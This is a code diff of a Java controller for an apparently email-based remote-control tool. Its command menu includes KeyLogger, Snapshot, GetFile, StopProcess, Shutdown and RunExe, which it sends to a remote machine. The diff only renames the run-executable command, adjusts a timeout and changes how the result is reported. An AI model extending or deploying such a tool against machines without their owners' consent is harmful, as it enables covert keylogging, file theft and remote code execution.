@@ -55,7 +55,7 @@ public class sendMailController {
 
     public void initialize() {
         List<String> list = List.of("Snapshot", "KeyLogger", "GetFile",
-                "ListDirectory", "ListProcess", "StopProcess", "OpenProcess", "Shutdown", "RunExe");
+                "ListDirectory", "ListProcess", "StopProcess", "OpenProcess", "Shutdown", "RunExe/App");
         comboBox.setItems(FXCollections.observableList(list));
         comboBox.getSelectionModel().selectFirst();
         addField.setEditable(false);
@@ -98,10 +98,10 @@ public class sendMailController {
                             labelAddField.setText("Coming Soon");
                             sendBut.setDisable(false);
                         }
-                        case "RunExe" ->{
+                        case "RunExe/App" ->{
                             addField.setDisable(false);
                             addField.setEditable(true);
-                            labelAddField.setText("File's path");
+                            labelAddField.setText("File/App's path");
                             sendBut.setDisable(false);
                         }
                         default -> sendBut.setDisable(true);
@@ -336,7 +336,7 @@ public class sendMailController {
                 });
                 thread.start();
             }
-            case "RunExe" ->{
+            case "RunExe/App" ->{
                 int id = random.nextInt(1000, 9999);
                 int tmp = id % 1000 % 100 % 10;
                 while (tmp > 3) tmp -= 3;
@@ -348,12 +348,12 @@ public class sendMailController {
                         System.out.println(Thread.currentThread().getName());
                         SendMail.getInstance().sendMail("req / " + id + " / " + "runexe/"+filename);
                         logText(emoji1 + "ID: " + id + " Send Mail Successfully! Wait for response!", coloruse);
-                        String a = CheckMail.getInstance().listen(id, 400);
+                        String a = CheckMail.getInstance().listen(id, 40);
                         if (a != null) {
-                            if (a.equals("0"))
-                                logText(emoji1 + "Exitcode: " + a, coloruse);
+                            if (a.equals("true"))
+                                logText(emoji1 + "Run exe/app successfully", coloruse);
                             else
-                                logText(emoji3+ "Exitcode: " + a, coloruse);
+                                logText(emoji3+ "Run exe/app fail: " + a, coloruse);
                         } else {
                             logText(emoji3 + "ID: " + id + " Error happens", "red");
                         }
